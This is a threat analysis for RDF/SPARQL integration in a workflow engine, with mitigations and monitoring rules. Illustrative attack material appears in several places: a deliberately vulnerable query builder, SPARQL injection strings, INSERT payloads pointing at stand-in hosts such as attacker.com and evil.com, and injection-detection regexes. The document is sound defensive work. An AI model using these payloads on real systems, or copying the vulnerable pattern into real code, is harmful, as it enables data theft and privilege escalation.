# Security Threat Analysis for YAWL Ontology Integration

**Version:** 1.0
**Date:** 2025-11-08
**Status:** Implementation-Ready
**Author:** Security Analyst (ULTRATHINK Swarm)
**Framework:** knhk Workflow Engine
**Ontology:** YAWL 4.0 RDF/OWL

---

## Executive Summary

This document provides a comprehensive threat analysis for the YAWL ontology integration in the knhk workflow engine. It identifies attack vectors specific to RDF/SPARQL systems, proposes mitigation strategies, and defines security validation requirements.

**Critical Threats Identified:**
1. **SPARQL Injection** (OWASP #1 equivalent for RDF)
2. **Ontology Injection Attacks** (malicious triple insertion)
3. **Information Leakage** (via graph traversal)
4. **Privilege Escalation** (via resource allocation manipulation)
5. **Data Provenance Tampering** (audit trail corruption)

**Risk Assessment:**
- **Critical**: 2 threats (SPARQL Injection, Privilege Escalation)
- **High**: 2 threats (Ontology Injection, Provenance Tampering)
- **Medium**: 1 threat (Information Leakage)

---

## 1. Threat Model Overview

### 1.1 Attack Surface

```
┌─────────────────────────────────────────────────────────┐
│                    ATTACK SURFACE                       │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │ 1. SPARQL Query Interface                        │  │
│  │    - User-supplied SPARQL queries               │  │
│  │    - Query parameter injection                  │  │
│  │    - Query result manipulation                  │  │
│  └──────────────────────────────────────────────────┘  │
│                          ↓                              │
│  ┌──────────────────────────────────────────────────┐  │
│  │ 2. RDF Triple Store                              │  │
│  │    - Triple insertion (INSERT DATA)             │  │
│  │    - Triple modification (DELETE/INSERT)        │  │
│  │    - Graph manipulation                         │  │
│  └──────────────────────────────────────────────────┘  │
│                          ↓                              │
│  ┌──────────────────────────────────────────────────┐  │
│  │ 3. Ontology Schema                               │  │
│  │    - Schema poisoning                           │  │
│  │    - Class hierarchy manipulation               │  │
│  │    - Property injection                         │  │
│  └──────────────────────────────────────────────────┘  │
│                          ↓                              │
│  ┌──────────────────────────────────────────────────┐  │
│  │ 4. Access Control System                         │  │
│  │    - Permission bypass                          │  │
│  │    - Role escalation                            │  │
│  │    - ACL tampering                              │  │
│  └──────────────────────────────────────────────────┘  │
│                          ↓                              │
│  ┌──────────────────────────────────────────────────┐  │
│  │ 5. Provenance/Audit Trail (Lockchain)           │  │
│  │    - Audit log injection                        │  │
│  │    - Provenance deletion                        │  │
│  │    - Chain integrity attacks                    │  │
│  └──────────────────────────────────────────────────┘  │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 1.2 Threat Actors

| Actor Type | Motivation | Capabilities | Target Assets |
|-----------|-----------|--------------|---------------|
| **External Attacker** | Data theft, disruption | SPARQL injection, query fuzzing | Workflow specifications, metadata |
| **Malicious Insider** | Privilege escalation | Resource allocation manipulation | Resourcing data, ACL rules |
| **Compromised Service** | Lateral movement | Triple injection, graph tampering | All RDF graphs |
| **Supply Chain Attack** | Code execution | Ontology poisoning, schema corruption | YAWL ontology schema |
| **Negligent User** | Accidental data exposure | Overly permissive queries | Sensitive properties |

### 1.3 Assets & Impact

```yaml
CriticalAssets:
  - asset: "Workflow Specifications"
    classes: [yawl:Specification, yawl:Net, yawl:Task]
    impact:
      confidentiality: "HIGH - Business process exposure"
      integrity: "CRITICAL - Workflow corruption leads to business logic errors"
      availability: "HIGH - Workflow engine failure"

  - asset: "Resource Allocation Data"
    classes: [yawl:Resourcing, yawl:ResourcingSet, yawl:ResourcingPrivileges]
    impact:
      confidentiality: "CRITICAL - Organizational structure exposure"
      integrity: "CRITICAL - Privilege escalation, SOD bypass"
      availability: "MEDIUM - Workflow stalls due to resource unavailability"

  - asset: "Workflow Metadata"
    classes: [yawl:Metadata]
    properties: [yawl:creator, yawl:contributor, yawl:created]
    impact:
      confidentiality: "HIGH - User identity exposure"
      integrity: "MEDIUM - Falsified attribution"
      availability: "LOW - Metadata loss doesn't stop workflows"

  - asset: "Service Endpoints"
    classes: [yawl:WebServiceGateway, yawl:YAWLService]
    properties: [yawl:wsdlLocation, yawl:operationName]
    impact:
      confidentiality: "HIGH - Infrastructure topology exposure"
      integrity: "CRITICAL - Endpoint redirection to malicious services"
      availability: "HIGH - Service endpoint denial"

  - asset: "Audit Trail (Lockchain)"
    graphs: ["http://knhk.io/system/audit"]
    impact:
      confidentiality: "MEDIUM - Audit data exposure"
      integrity: "CRITICAL - Loss of non-repudiation, compliance failure"
      availability: "MEDIUM - Cannot prove compliance"
```

---

## 2. Threat #1: SPARQL Injection (CRITICAL)

### 2.1 Attack Description

**SPARQL Injection** is the RDF equivalent of SQL injection, where an attacker manipulates user-supplied input to alter the structure or logic of a SPARQL query.

**Attack Vector:**

```python
# VULNERABLE CODE (DO NOT USE)
def get_workflow_by_name(user_input: str):
    query = f"""
    SELECT ?workflow ?description
    WHERE {{
        ?workflow a yawl:Specification ;
                  yawl:name "{user_input}" ;
                  yawl:hasMetadata [ yawl:description ?description ] .
    }}
    """
    return execute_sparql(query)

# ATTACKER INPUT:
user_input = '" . } { ?workflow ?p ?o } #'

# RESULTING QUERY (injected):
"""
SELECT ?workflow ?description
WHERE {
    ?workflow a yawl:Specification ;
              yawl:name "" .
    } { ?workflow ?p ?o } #" ;
              yawl:hasMetadata [ yawl:description ?description ] .
}
"""
# The injected query now returns ALL triples for ALL workflows, bypassing the name filter
```

### 2.2 Attack Scenarios

**Scenario 1: Graph Enumeration**

```sparql
# Intended query: Get workflow by name
SELECT ?workflow WHERE {
    ?workflow yawl:name "SafeWorkflow" .
}

# Attacker input: '" . ?workflow ?p ?o . #
# Injected query: Returns ALL workflow triples
SELECT ?workflow WHERE {
    ?workflow yawl:name "" .
    ?workflow ?p ?o .
    #" .
}
```

**Scenario 2: Permission Bypass**

```sparql
# Intended query: Get user's accessible workflows
SELECT ?workflow WHERE {
    GRAPH ?g {
        ?workflow a yawl:Specification .
    }
    FILTER(?g IN (<http://knhk.io/workflows/user-graphs>))
}

# Attacker input: '> } } #
# Injected query: Removes FILTER, exposing all graphs
SELECT ?workflow WHERE {
    GRAPH ?g {
        ?workflow a yawl:Specification .
    }
    FILTER(?g IN (<http://knhk.io/workflows/> } } #>))
}
```

**Scenario 3: Data Exfiltration**

```sparql
# Intended query: Get workflow title
SELECT ?title WHERE {
    :spec-a yawl:hasMetadata [ yawl:title ?title ] .
}

# Attacker input: '?title ] ; yawl:creator ?creator ; yawl:wsdlLocation ?endpoint . #
# Injected query: Extracts creator and service endpoints
SELECT ?title WHERE {
    :spec-a yawl:hasMetadata [
        yawl:title ?title ] ; yawl:creator ?creator ; yawl:wsdlLocation ?endpoint .
        #
    ] .
}
```

### 2.3 Mitigation Strategies

**Defense 1: Parameterized Queries (PRIMARY DEFENSE)**

```rust
// SECURE CODE: Use parameterized queries
pub fn get_workflow_by_name(name: &str) -> Result<Vec<Workflow>, QueryError> {
    let query = Query::new(r#"
        SELECT ?workflow ?description
        WHERE {
            ?workflow a yawl:Specification ;
                      yawl:name ?name ;
                      yawl:hasMetadata [ yawl:description ?description ] .
        }
    "#);

    // Bind parameter safely (automatic escaping)
    query.bind("name", Literal::new(name))?;

    execute_query(query)
}
```

**Defense 2: Input Validation & Sanitization**

```rust
pub fn validate_sparql_identifier(input: &str) -> Result<&str, ValidationError> {
    // Allow only safe characters: alphanumeric, dash, underscore
    let safe_pattern = Regex::new(r"^[a-zA-Z0-9_-]+$").unwrap();

    if !safe_pattern.is_match(input) {
        return Err(ValidationError::InvalidCharacters);
    }

    // Maximum length check
    if input.len() > 256 {
        return Err(ValidationError::TooLong);
    }

    // Reject SPARQL keywords
    let keywords = vec!["SELECT", "INSERT", "DELETE", "WHERE", "FILTER", "UNION", "OPTIONAL"];
    if keywords.iter().any(|k| input.to_uppercase().contains(k)) {
        return Err(ValidationError::ContainsKeyword);
    }

    Ok(input)
}
```

**Defense 3: Query Whitelisting**

```rust
pub enum AllowedQuery {
    GetWorkflowByName,
    GetWorkflowsByCreator,
    GetTasksInNet,
    // ... exhaustive list of allowed query templates
}

impl AllowedQuery {
    pub fn execute(&self, params: &HashMap<String, Value>) -> Result<QueryResults, QueryError> {
        let query_template = match self {
            AllowedQuery::GetWorkflowByName => {
                "SELECT ?workflow WHERE { ?workflow yawl:name ?name }"
            },
            AllowedQuery::GetWorkflowsByCreator => {
                "SELECT ?workflow WHERE { ?workflow yawl:hasMetadata [ yawl:creator ?creator ] }"
            },
            // ... other templates
        };

        // Only execute pre-defined, vetted query templates
        execute_parameterized(query_template, params)
    }
}
```

**Defense 4: SPARQL Query Analysis & Blocking**

```rust
pub fn analyze_query_safety(query: &str) -> Result<(), SecurityError> {
    // Parse query into AST
    let ast = sparql_parser::parse(query)?;

    // Block dangerous patterns
    for pattern in ast.patterns() {
        // Block queries without GRAPH clause (access all graphs)
        if !pattern.has_graph_clause() {
            return Err(SecurityError::MissingGraphClause);
        }

        // Block queries with unbounded triple patterns (e.g., ?s ?p ?o)
        if pattern.is_fully_unbounded() {
            return Err(SecurityError::UnboundedTriplePattern);
        }

        // Block UNION clauses (can bypass filters)
        if pattern.has_union() && !is_admin_user() {
            return Err(SecurityError::UnauthorizedUnion);
        }

        // Block SERVICE clauses (federated query can leak data)
        if pattern.has_service_clause() {
            return Err(SecurityError::FederatedQueryNotAllowed);
        }
    }

    Ok(())
}
```

### 2.4 Detection & Monitoring

```yaml
SPARQLInjectionDetection:
  - indicator: "Query contains multiple closing braces"
    pattern: '"}[\s]*}[\s]*}'
    severity: HIGH
    action: BLOCK

  - indicator: "Query contains comment injection"
    pattern: '#[^"]*"'
    severity: HIGH
    action: BLOCK

  - indicator: "Query contains UNION without explicit GRAPH"
    pattern: 'UNION\s*{\s*\?'
    severity: MEDIUM
    action: ALERT

  - indicator: "Query attempts to access system graphs"
    pattern: 'GRAPH\s*<http://knhk.io/system/'
    severity: HIGH
    action: ALERT (only block if user is not admin)

  - indicator: "Query execution time anomaly"
    threshold: "> 10x average query time"
    severity: MEDIUM
    action: ALERT (possible DoS or data exfiltration)
```

---

## 3. Threat #2: Ontology Injection Attacks (HIGH)

### 3.1 Attack Description

**Ontology Injection** occurs when an attacker inserts malicious RDF triples that corrupt the ontology schema, alter workflow semantics, or inject backdoors into workflow definitions.

**Attack Vector:**

```sparql
# Attacker gains WRITE permission on a workflow graph
# Injects malicious triple to redirect task execution

INSERT DATA {
    GRAPH <http://knhk.io/workflows/spec-a> {
        # Original task: :task-approval yawl:hasDecomposesTo :net-approval

        # Injected triple: Redirect to malicious decomposition
        :task-approval yawl:hasDecomposesTo :malicious-net .

        :malicious-net a yawl:Net ;
            yawl:hasTask :malicious-task .

        :malicious-task a yawl:Task ;
            yawl:hasDecomposesTo :malicious-service .

        :malicious-service a yawl:WebServiceGateway ;
            yawl:hasYAWLService [
                yawl:wsdlLocation "http://attacker.com/steal-data"^^xsd:anyURI ;
                yawl:operationName "exfiltrate"
            ] .
    }
}
```

### 3.2 Attack Scenarios

**Scenario 1: Resource Allocation Manipulation**

```sparql
# Attacker escalates privileges by injecting resource allocation

INSERT DATA {
    GRAPH <http://knhk.io/workflows/spec-a> {
        :task-financial-approval yawl:hasResourcing [
            a yawl:Resourcing ;
            yawl:hasOffer [
                yawl:hasDistributionSet [
                    yawl:hasInitialSet [
                        # Inject attacker as authorized participant
                        yawl:participant "attacker@evil.com"
                    ]
                ]
            ]
        ] .
    }
}

# Result: Attacker now authorized to perform financial approval tasks
```

**Scenario 2: Workflow Logic Tampering**

```sparql
# Attacker modifies control flow to bypass approval step

DELETE {
    GRAPH <http://knhk.io/workflows/spec-a> {
        :task-submit yawl:flowsInto [
            yawl:nextElementRef :task-approval
        ] .
    }
}
INSERT {
    GRAPH <http://knhk.io/workflows/spec-a> {
        # Bypass approval, go directly to execution
        :task-submit yawl:flowsInto [
            yawl:nextElementRef :task-execute
        ] .
    }
}
```

**Scenario 3: Timer Manipulation (Denial of Service)**

```sparql
# Attacker injects infinite timer to stall workflow

INSERT DATA {
    GRAPH <http://knhk.io/workflows/spec-a> {
        :critical-task yawl:hasTimer [
            a yawl:Timer ;
            yawl:expiry 9999999999999^^xsd:long ;  # Far future
            yawl:hasTrigger yawl:TimerTriggerOnEnabled
        ] .
    }
}

# Result: critical-task never executes (waits forever)
```

### 3.3 Mitigation Strategies

**Defense 1: Schema Validation**

```rust
pub fn validate_triple_insert(triple: &Triple, graph: &Graph) -> Result<(), ValidationError> {
    // Rule 1: Validate RDF classes exist in YAWL ontology
    if triple.predicate == rdf::TYPE {
        if !YAWL_ONTOLOGY.contains_class(&triple.object) {
            return Err(ValidationError::UnknownClass(triple.object.clone()));
        }
    }

    // Rule 2: Validate properties exist in YAWL ontology
    if !YAWL_ONTOLOGY.contains_property(&triple.predicate) {
        return Err(ValidationError::UnknownProperty(triple.predicate.clone()));
    }

    // Rule 3: Validate domain/range constraints
    if let Some(domain) = YAWL_ONTOLOGY.get_domain(&triple.predicate) {
        let subject_types = graph.get_types(&triple.subject);
        if !subject_types.iter().any(|t| is_subclass_of(t, &domain)) {
            return Err(ValidationError::DomainViolation);
        }
    }

    if let Some(range) = YAWL_ONTOLOGY.get_range(&triple.predicate) {
        if !matches_range(&triple.object, &range) {
            return Err(ValidationError::RangeViolation);
        }
    }

    // Rule 4: Validate cardinality constraints
    // Example: Task must have exactly 1 join type
    if triple.predicate == yawl::HAS_JOIN {
        let existing_joins = graph.query(&triple.subject, &yawl::HAS_JOIN, &WILDCARD);
        if existing_joins.len() >= 1 {
            return Err(ValidationError::CardinalityViolation("Task already has join type"));
        }
    }

    Ok(())
}
```

**Defense 2: Immutable Core Ontology**

```yaml
ImmutableOntology:
  description: "Core YAWL ontology schema is read-only"

  protection:
    - graphs:
        - "http://www.yawlfoundation.org/yawlschema"
      permissions:
        - users: "*"
          actions: [READ]
        - users: ["system-admin"]
          actions: [READ]  # Even admin cannot modify core schema

    - classes: [yawl:Task, yawl:Net, yawl:Specification, ...]
      modification: DENIED
      reason: "Core YAWL classes cannot be redefined"

    - properties: [yawl:hasTask, yawl:flowsInto, yawl:hasResourcing, ...]
      modification: DENIED
      reason: "Core YAWL properties cannot be altered"

  exceptions:
    - description: "Allow knhk extensions in separate namespace"
      namespace: "http://knhk.io/ontology#"
      validation: "Must not redefine yawl: classes or properties"
```

**Defense 3: Workflow Integrity Verification**

```rust
pub fn verify_workflow_integrity(spec: &Specification) -> Result<(), IntegrityError> {
    // Structural validation
    verify_structural_integrity(spec)?;

    // Semantic validation
    verify_semantic_integrity(spec)?;

    // Security validation
    verify_security_properties(spec)?;

    Ok(())
}

fn verify_structural_integrity(spec: &Specification) -> Result<(), IntegrityError> {
    // Check 1: Specification has exactly 1 root net
    let root_nets: Vec<_> = spec.decompositions()
        .filter_map(|d| d.as_net())
        .filter(|n| n.is_root_net())
        .collect();

    if root_nets.len() != 1 {
        return Err(IntegrityError::InvalidRootNetCount(root_nets.len()));
    }

    // Check 2: Every net has exactly 1 input condition and 1 output condition
    for net in spec.nets() {
        let input_conditions = net.input_conditions().count();
        let output_conditions = net.output_conditions().count();

        if input_conditions != 1 || output_conditions != 1 {
            return Err(IntegrityError::InvalidNetStructure);
        }
    }

    // Check 3: No dangling references
    for task in spec.tasks() {
        if let Some(decomp_ref) = task.decomposes_to() {
            if !spec.has_decomposition(&decomp_ref) {
                return Err(IntegrityError::DanglingDecomposition(decomp_ref));
            }
        }
    }

    Ok(())
}

fn verify_semantic_integrity(spec: &Specification) -> Result<(), IntegrityError> {
    // Check 1: No cycles in XOR-splits (soundness requirement)
    for net in spec.nets() {
        if has_xor_cycle(net) {
            return Err(IntegrityError::XORCycleDetected);
        }
    }

    // Check 2: All variables are properly scoped
    for task in spec.tasks() {
        for mapping in task.variable_mappings() {
            if !is_variable_in_scope(&mapping.target, task) {
                return Err(IntegrityError::VariableOutOfScope);
            }
        }
    }

    Ok(())
}

fn verify_security_properties(spec: &Specification) -> Result<(), IntegrityError> {
    // Check 1: No external service endpoints without approval
    for gateway in spec.web_service_gateways() {
        let wsdl = gateway.wsdl_location();
        if !is_approved_endpoint(&wsdl) {
            return Err(IntegrityError::UnapprovedEndpoint(wsdl));
        }
    }

    // Check 2: Resource allocation follows SOD rules
    for task in spec.tasks() {
        if let Some(resourcing) = task.resourcing() {
            if violates_separation_of_duties(task, resourcing) {
                return Err(IntegrityError::SODViolation(task.id()));
            }
        }
    }

    Ok(())
}
```

**Defense 4: Change Approval Workflow**

```yaml
ChangeApprovalPolicy:
  - resource: "yawl:Specification graphs"
    changes: [INSERT, DELETE, UPDATE]
    requires:
      - approval_from: "workflow-owner"
      - review_by: "security-manager"
      - audit_log: true

  - resource: "yawl:Resourcing instances"
    changes: [INSERT, UPDATE]
    requires:
      - approval_from: "resource-manager"
      - dual_control: true  # Two approvers required
      - sox_audit: true

  - resource: "yawl:WebServiceGateway instances"
    changes: [INSERT, UPDATE]
    requires:
      - approval_from: "system-admin"
      - security_scan: "endpoint_validation"
      - pci_compliance_check: true
```

### 3.4 Detection & Monitoring

```yaml
OntologyInjectionDetection:
  - indicator: "Insertion of new Web Service Gateway"
    query: "?gateway a yawl:WebServiceGateway . ?gateway yawl:wsdlLocation ?url"
    severity: HIGH
    action: "Alert security team, require approval"

  - indicator: "Modification of resource allocation"
    query: "?task yawl:hasResourcing ?res . ?res yawl:hasOffer ?offer"
    severity: HIGH
    action: "Log to Lockchain, require dual approval"

  - indicator: "Deletion of flow relationships"
    pattern: "DELETE { ?s yawl:flowsInto ?o }"
    severity: MEDIUM
    action: "Require workflow owner approval"

  - indicator: "Timer expiry > 1 year in future"
    query: "?timer yawl:expiry ?exp . FILTER(?exp > ${now + 365 days})"
    severity: MEDIUM
    action: "Alert workflow owner"
```

---

## 4. Threat #3: RDF Data Validation & Sanitization

### 4.1 Data Type Validation

**Invalid Literal Injection:**

```sparql
# Attacker attempts to inject invalid data types

INSERT DATA {
    GRAPH <http://knhk.io/workflows/spec-a> {
        # Valid: xsd:date
        :spec-a yawl:created "2025-11-08"^^xsd:date .

        # ATTACK: Invalid date format (should be rejected)
        :spec-a yawl:created "not-a-date"^^xsd:date .

        # ATTACK: Type confusion (integer as boolean)
        :task-a yawl:mandatory "99999"^^xsd:boolean .

        # ATTACK: Oversized string (DoS)
        :task-a yawl:name "${'A' * 1000000}"^^xsd:string .
    }
}
```

**Mitigation:**

```rust
pub fn validate_literal(literal: &Literal, expected_type: &XsdDatatype) -> Result<(), ValidationError> {
    match expected_type {
        XsdDatatype::Date => {
            // Parse as ISO 8601 date
            if chrono::NaiveDate::parse_from_str(&literal.value, "%Y-%m-%d").is_err() {
                return Err(ValidationError::InvalidDateFormat);
            }
        },
        XsdDatatype::Boolean => {
            if !matches!(literal.value.as_str(), "true" | "false" | "1" | "0") {
                return Err(ValidationError::InvalidBoolean);
            }
        },
        XsdDatatype::Integer => {
            if literal.value.parse::<i64>().is_err() {
                return Err(ValidationError::InvalidInteger);
            }
        },
        XsdDatatype::String => {
            // Enforce maximum string length (prevent DoS)
            if literal.value.len() > MAX_STRING_LENGTH {
                return Err(ValidationError::StringTooLong);
            }

            // Reject control characters (except newline, tab)
            if literal.value.chars().any(|c| c.is_control() && c != '\n' && c != '\t') {
                return Err(ValidationError::InvalidCharacters);
            }
        },
        XsdDatatype::AnyURI => {
            // Validate URI syntax
            if url::Url::parse(&literal.value).is_err() {
                return Err(ValidationError::InvalidURI);
            }

            // Whitelist allowed URI schemes
            let allowed_schemes = vec!["http", "https", "urn"];
            let uri = url::Url::parse(&literal.value).unwrap();
            if !allowed_schemes.contains(&uri.scheme()) {
                return Err(ValidationError::DisallowedURIScheme(uri.scheme().to_string()));
            }
        },
        _ => {}
    }

    Ok(())
}
```

### 4.2 URI Validation & Whitelisting

```rust
pub fn validate_service_endpoint(wsdl_uri: &str) -> Result<(), SecurityError> {
    let uri = url::Url::parse(wsdl_uri)
        .map_err(|_| SecurityError::InvalidURI)?;

    // Check 1: HTTPS required for external services
    if !uri.host_str().map_or(false, |h| is_internal_host(h)) {
        if uri.scheme() != "https" {
            return Err(SecurityError::InsecureScheme);
        }
    }

    // Check 2: Whitelist of approved domains
    let approved_domains = load_approved_service_domains();
    let host = uri.host_str().ok_or(SecurityError::MissingHost)?;

    if !approved_domains.iter().any(|domain| host.ends_with(domain)) {
        return Err(SecurityError::UnapprovedDomain(host.to_string()));
    }

    // Check 3: Block private IP ranges (SSRF prevention)
    if let Some(ip) = uri.host() {
        if is_private_ip(ip) {
            return Err(SecurityError::PrivateIPNotAllowed);
        }
    }

    Ok(())
}

fn is_private_ip(host: url::Host) -> bool {
    match host {
        url::Host::Ipv4(ip) => {
            ip.is_private() || ip.is_loopback() || ip.is_link_local()
        },
        url::Host::Ipv6(ip) => {
            ip.is_loopback() || ip.is_unique_local()
        },
        _ => false
    }
}
```

---

## 5. Threat #4: Provenance Tracking & Lockchain Integration

### 5.1 Immutable Audit Trail

**Lockchain Integration for RDF Operations:**

```rust
pub fn insert_triple_with_audit(
    triple: &Triple,
    graph: &str,
    user: &User,
    lockchain: &mut Lockchain,
) -> Result<(), AuditError> {
    // 1. Validate triple
    validate_triple_insert(triple, graph)?;

    // 2. Check permission
    if !user.can_write(graph) {
        return Err(AuditError::PermissionDenied);
    }

    // 3. Insert triple
    rdf_store.insert(triple, graph)?;

    // 4. Record to Lockchain (IMMUTABLE)
    let audit_record = AuditRecord {
        timestamp: Utc::now(),
        user: user.id.clone(),
        operation: Operation::Insert,
        graph: graph.to_string(),
        triple: triple.clone(),
        hash: compute_triple_hash(triple),
    };

    lockchain.append(audit_record)?;

    // 5. Also store in RDF audit graph (for querying)
    insert_audit_triple(&audit_record)?;

    Ok(())
}

fn insert_audit_triple(record: &AuditRecord) -> Result<(), RdfError> {
    let audit_triple = format!(r#"
        INSERT DATA {{
            GRAPH <http://knhk.io/system/audit> {{
                [] a :AuditEvent ;
                    :timestamp "{}"^^xsd:dateTime ;
                    :user "{}" ;
                    :operation :Insert ;
                    :graph <{}> ;
                    :subject <{}> ;
                    :predicate <{}> ;
                    :object {} ;
                    :hash "{}" ;
                    :lockchain_index {} .
            }}
        }}
    "#,
        record.timestamp.to_rfc3339(),
        record.user,
        record.graph,
        record.triple.subject,
        record.triple.predicate,
        format_rdf_object(&record.triple.object),
        record.hash,
        record.lockchain_index,
    );

    execute_sparql_update(&audit_triple)
}
```

### 5.2 Audit Trail Integrity Verification

```rust
pub fn verify_audit_trail_integrity(lockchain: &Lockchain) -> Result<(), IntegrityError> {
    // 1. Verify Lockchain cryptographic integrity
    lockchain.verify_chain_integrity()?;

    // 2. Verify RDF audit graph matches Lockchain
    for (index, record) in lockchain.records().enumerate() {
        let rdf_record = query_audit_record(index)?;

        if !records_match(&record, &rdf_record) {
            return Err(IntegrityError::AuditMismatch {
                lockchain_index: index,
                lockchain_hash: record.hash.clone(),
                rdf_hash: rdf_record.hash.clone(),
            });
        }
    }

    // 3. Verify no orphaned audit records in RDF
    let rdf_count = count_audit_records()?;
    let lockchain_count = lockchain.len();

    if rdf_count != lockchain_count {
        return Err(IntegrityError::RecordCountMismatch {
            rdf: rdf_count,
            lockchain: lockchain_count,
        });
    }

    Ok(())
}
```

### 5.3 Detecting Provenance Tampering

```yaml
ProvenanceTamperingDetection:
  - indicator: "Audit record deleted from RDF graph"
    detection: "Lockchain index gap in RDF audit graph"
    severity: CRITICAL
    action: "Alert security team, freeze system"

  - indicator: "Audit record hash mismatch"
    detection: "RDF audit hash != Lockchain record hash"
    severity: CRITICAL
    action: "Alert security team, initiate incident response"

  - indicator: "Audit record modification attempt"
    detection: "DELETE/UPDATE on audit graph (should be append-only)"
    severity: CRITICAL
    action: "Block operation, alert security team"

  - indicator: "Lockchain verification failure"
    detection: "Cryptographic chain integrity check fails"
    severity: CRITICAL
    action: "System freeze, emergency restore from backup"
```

---

## 6. Information Leakage via Graph Traversal (MEDIUM)

### 6.1 Attack Description

**Graph Traversal Leakage** occurs when an attacker exploits RDF's graph structure to traverse relationships and access data they shouldn't have permission to view.

**Attack Scenario:**

```sparql
# Attacker has permission to view Task A, but not Resourcing data
# However, they can traverse from Task → Resourcing via yawl:hasResourcing

# Legitimate query (allowed):
SELECT ?task WHERE {
    ?task a yawl:Task ;
          yawl:id "task-a" .
}

# Exploitative query (should be blocked):
SELECT ?participant WHERE {
    ?task a yawl:Task ;
          yawl:id "task-a" ;
          yawl:hasResourcing ?resourcing .

    ?resourcing yawl:hasOffer ?offer .
    ?offer yawl:hasDistributionSet ?dist .
    ?dist yawl:hasInitialSet ?set .
    ?set yawl:participant ?participant .  # Leaks restricted data
}
```

### 6.2 Mitigation: Path-Based Access Control

```rust
pub fn check_path_permission(query: &ParsedQuery, user: &User) -> Result<(), SecurityError> {
    // Extract property paths from query
    let paths = query.extract_property_paths();

    for path in paths {
        // Check if user has permission for ALL properties in path
        for property in path.properties() {
            if !user.can_access_property(property) {
                return Err(SecurityError::UnauthorizedPropertyAccess {
                    property: property.clone(),
                    path: path.to_string(),
                });
            }
        }

        // Check if path traverses restricted classes
        for class in path.traversed_classes() {
            if !user.can_access_class(class) {
                return Err(SecurityError::UnauthorizedClassTraversal {
                    class: class.clone(),
                    path: path.to_string(),
                });
            }
        }
    }

    Ok(())
}
```

---

## 7. Security Testing & Validation

### 7.1 Penetration Testing Checklist

```yaml
PenetrationTestingScenarios:
  SPARQL_Injection:
    - test: "Comment injection bypass"
      input: '" . } # '
      expected: "BLOCKED with error"

    - test: "UNION clause injection"
      input: '" } UNION { ?s ?p ?o } # '
      expected: "BLOCKED with error"

    - test: "FILTER bypass"
      input: '" . FILTER(1=1) } # '
      expected: "BLOCKED with error"

  Ontology_Injection:
    - test: "Malicious service endpoint insertion"
      sparql: "INSERT DATA { :task yawl:hasDecomposesTo [ a yawl:WebServiceGateway ; yawl:wsdlLocation <http://evil.com/> ] }"
      expected: "BLOCKED (unapproved endpoint)"

    - test: "Resource allocation privilege escalation"
      sparql: "INSERT DATA { :task yawl:hasResourcing [ yawl:hasOffer [ ... yawl:participant 'attacker' ] ] }"
      expected: "BLOCKED (requires approval) OR LOGGED to audit"

  Information_Leakage:
    - test: "Property traversal to restricted data"
      sparql: "SELECT ?participant WHERE { :task-a yawl:hasResourcing/yawl:hasOffer/.../yawl:participant ?participant }"
      expected: "BLOCKED (unauthorized property access)"

    - test: "Class traversal to restricted instances"
      sparql: "SELECT ?resourcing WHERE { :task-a yawl:hasResourcing ?resourcing }"
      expected: "BLOCKED if user lacks yawl:Resourcing class permission"

  Provenance_Tampering:
    - test: "Delete audit record"
      sparql: "DELETE DATA { GRAPH <http://knhk.io/system/audit> { ?event a :AuditEvent } }"
      expected: "BLOCKED (audit graph is append-only)"

    - test: "Modify audit timestamp"
      sparql: "DELETE/INSERT { ... :timestamp ?new_time ... }"
      expected: "BLOCKED (audit records immutable)"
```

### 7.2 Continuous Security Monitoring

```yaml
SecurityMetrics:
  - metric: "SPARQL injection attempts"
    query: "Count of blocked queries with injection patterns"
    threshold: "> 10 per hour"
    alert: "Possible attack in progress"

  - metric: "Permission denied rate"
    query: "Count of permission denied errors / total queries"
    threshold: "> 5%"
    alert: "Investigate misconfigured permissions OR attack"

  - metric: "Audit trail integrity check"
    frequency: "Every 1 hour"
    action: "verify_audit_trail_integrity()"
    on_failure: "CRITICAL alert, system freeze"

  - metric: "Unapproved endpoint insertion attempts"
    query: "Count of INSERT yawl:WebServiceGateway without approval"
    threshold: "> 0"
    alert: "Security team review required"
```

---

## 8. Incident Response Procedures

### 8.1 Detection → Response Flow

```
┌─────────────────┐      ┌──────────────────┐      ┌────────────────┐
│ Threat Detected │─────▶│ Severity Triage  │─────▶│ Automated      │
│ (alert/log)     │      │ (CRITICAL/HIGH)  │      │ Containment    │
└─────────────────┘      └──────────────────┘      └────────────────┘
                                   │                          │
                                   │                          │
                                   ▼                          ▼
                         ┌──────────────────┐      ┌────────────────┐
                         │ Security Team    │      │ Freeze Graph   │
                         │ Notification     │      │ (read-only)    │
                         └──────────────────┘      └────────────────┘
                                   │                          │
                                   │                          │
                                   ▼                          ▼
                         ┌──────────────────┐      ┌────────────────┐
                         │ Forensic         │      │ Rollback to    │
                         │ Investigation    │      │ Last Known     │
                         │ (Lockchain)      │      │ Good State     │
                         └──────────────────┘      └────────────────┘
```

### 8.2 Incident Severity Levels

```yaml
IncidentSeverity:
  CRITICAL:
    examples:
      - SPARQL injection successful
      - Audit trail tampering detected
      - Privilege escalation via resource allocation
    response_time: "< 15 minutes"
    actions:
      - Freeze affected graphs (read-only mode)
      - Notify security team immediately
      - Begin forensic analysis
      - Prepare rollback plan

  HIGH:
    examples:
      - Unapproved service endpoint insertion
      - Multiple failed permission checks from same user
      - Ontology injection attempt
    response_time: "< 1 hour"
    actions:
      - Alert security team
      - Review audit logs
      - Identify affected workflows
      - Require manual approval for operations

  MEDIUM:
    examples:
      - Information leakage via graph traversal
      - Invalid data type insertion
      - Excessive query load
    response_time: "< 4 hours"
    actions:
      - Log for review
      - Monitor for escalation
      - Update access control rules if needed
```

---

## 9. Compliance Integration

### 9.1 SOX Compliance Mapping

```yaml
SOX_Controls:
  - control: "SOX 404 - Access Controls"
    requirement: "Restrict access to financial workflow data"
    implementation:
      - Graph-level ACL for financial specifications
      - Role-based access control (RBAC)
      - Property-level redaction of sensitive metadata
    validation: "Quarterly access review"

  - control: "SOX 404 - Change Management"
    requirement: "Audit all changes to financial workflows"
    implementation:
      - Lockchain immutable audit trail
      - Dual approval for resource allocation changes
      - Pre-deployment integrity verification
    validation: "Real-time Lockchain verification"

  - control: "SOX 302 - Separation of Duties"
    requirement: "Prevent single person from completing entire financial process"
    implementation:
      - SOD rules in resource allocation validation
      - Different roles for workflow design vs. execution
      - Audit trail proves SOD compliance
    validation: "verify_separation_of_duties()"
```

### 9.2 PCI-DSS Compliance Mapping

```yaml
PCI_DSS_Controls:
